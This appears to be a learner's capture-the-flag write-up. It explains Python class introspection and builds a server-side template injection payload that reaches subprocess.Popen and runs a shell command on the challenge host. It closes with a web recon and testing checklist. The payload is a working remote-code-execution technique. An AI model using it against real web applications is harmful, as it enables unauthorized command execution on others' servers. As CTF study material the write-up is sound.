i didn't like not knowing wtf i was actually doing; tried to figure out what this whole mro subclasses stuff is all about. heres what i got:
every object has this __class__ attr to tell you what kind of class it is. 'helloworld'.__class__ for example returns <class 'str'>
every class has this __mro__ attr (method resolution order) which shows the full chain of inheritance, all the way from the base object class
''.__class__.__mro__ returns (<class 'str'>, <class 'object'>); thats the entire chain. by getting [1] of this tuple we reference the base object class
running .__subclasses__() we can get a list of all classes that inherit from the referenced class
by running it on the object class, we effectively get a list of every class in the program available for us to mess with, since literally everything inherits the object class.
we gotta find the exact index of Popen. i used some JS to do this

let s = "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>..."; let sClean = s.replaceAll("<", '"<').replaceAll(">", '">"'); let arr = JSON.parse(sClean); console.log(arr.indexOf("<class 'subprocess.Popen'>")) // we got 356
{{''.__class__.__mro__[1].__subclasses__()[356]}} does indeed return "<class 'subprocess.Popen'>". we're good.
{{''.__class__.__mro__[1].__subclasses__()[356]('pwd', shell=True,stdout=-1).communicate()}} returned "(b'/challenge\n', None)." is that a tuple?

reflections: that lowkey took too long. i think right about now is a good time to pause and come up with an actual step-by-step methodology to use for these web rooms. i'm once again letting assumptions screw me over, starting where I *think* i should start rather than building a base of knowledge around the app that would actually help me crack it; when the room description tells me all that i need to know, like how TakeOver's said that it revolved around subdomain enum, Inspect HTML's was literally in the name, I can have that starting point off the gate and get lucky with it, but i'll be missing important things that will bite me later. we cant have that happen during picoCTF.
looking at my writeups so far, i *am* doing a lot of things correctly - they just need to become more systematic, and i need to stop second-guessing myself. my idea for that system:
1. Recon (the most important step):
- Visit all pages and click everything; test all functionality (forms, buttons, inputs, etc)
- Note any and all errors, versions, etc (errors can reveal framework as well)
- Wappalyzer
- Look at robots.txt and sitemap.xml if they exist
- Check Devtools:
- View source on EVERY PAGE
- Network (ALL requests, responses, headers, etc)
- Console (errors, debug, etc)
- Application/Storage (cookies, localstorage, sessionstorage)
- Security (SSL info)
- Sources (weird JS, any other imported files)
2. Enumeration
- directories
- if interesting endpoints found, try fuzzing for parameters
- subdomains (dns)
- vhost
- try on port 80 AND port 443; they can be different
3. Test For Specific Vulns
- what's the room called? that might be a hint
- input reflection? check for XSS, SSTI, SQLi, etc
- authentication? check default creds, brute force, other bypass techniques
- server software/templating engine visible? try for SSTI
- hidden comments, headers? check for dev notes
